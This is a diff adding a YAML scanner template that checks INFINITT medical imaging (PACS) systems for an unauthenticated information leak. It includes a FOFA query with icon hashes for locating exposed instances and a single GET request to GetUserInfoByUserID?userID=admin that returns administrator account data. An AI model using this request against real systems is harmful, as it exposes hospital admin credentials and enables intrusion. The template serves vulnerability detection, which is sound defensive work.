@@ -1,0 +1,20 @@
+id: infinitt-getuserinfobyuserid-information-discosure
+
+info:
+  name: 英飞达医学影像存档与通信系统webservices接口存在信息泄露漏洞
+  author: zan8in
+  severity: high
+  veirified: true
+  description: |-
+    英飞达医学影像存档与通信系统在/webservices/WebUserLogin.asmx/接口处存在信息泄露漏洞，攻击者无需身份验证即可利用该漏洞获取系统后台管理员的账户密码信息，进而登录后台，导致系统安全性严重受损。
+    fofa: "INFINITT" && (icon_hash="1474455751" || icon_hash="702238928")
+  tags: infinitt,discosure
+  created: 2024/11/18
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin
+    expression: response.status == 200 && response.body.bcontains(b'<USERID>admin</USERID>') && response.body.bcontains(b'<NewDataSet>') && response.body.bcontains(b'<web_user_login>')
+expression: r0()
